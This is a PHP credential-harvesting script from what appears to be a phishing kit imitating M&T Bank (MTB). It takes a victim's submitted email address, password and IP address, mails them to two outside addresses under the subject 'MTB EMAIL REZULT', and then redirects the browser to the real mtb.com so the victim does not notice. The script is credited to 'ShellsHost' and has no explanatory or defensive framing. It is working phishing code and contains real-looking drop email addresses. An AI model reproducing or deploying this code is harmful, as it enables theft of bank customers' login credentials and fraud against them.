<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ MTB Info +--------------\n";
$message .= "Email : ".$_POST['emaila']."\n";
$message .= "Password: ".$_POST['epassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ShellsHost-----------------\n";
$send = "johnwoo9090@outlook.com,2050942366@etlgr.com";
$subject = "MTB EMAIL REZULT [ $ip ]";
$headers = "From: Mtb<logs@shellshost.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
?>
<script>
    window.top.location.href = "https://www.mtb.com/";

</script>s